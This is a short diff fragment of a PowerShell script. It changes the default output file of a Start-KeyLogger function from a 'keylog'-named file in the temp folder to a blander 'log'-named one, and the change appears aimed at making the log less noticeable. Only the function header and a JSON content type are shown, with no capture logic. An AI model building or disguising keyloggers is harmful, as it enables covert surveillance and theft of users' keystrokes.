@@ -21,7 +21,7 @@ $ContentType= 'application/json'
 
 
 
-function Start-KeyLogger($Path="$env:temp\keylog$(get-date -f MM-dd-HH-mm).txt") 
+function Start-KeyLogger($Path="$env:temp\log$(get-date -f MM-dd-HH-mm).txt") 
 {
   # Signatures for API Calls
   $signatures = @'
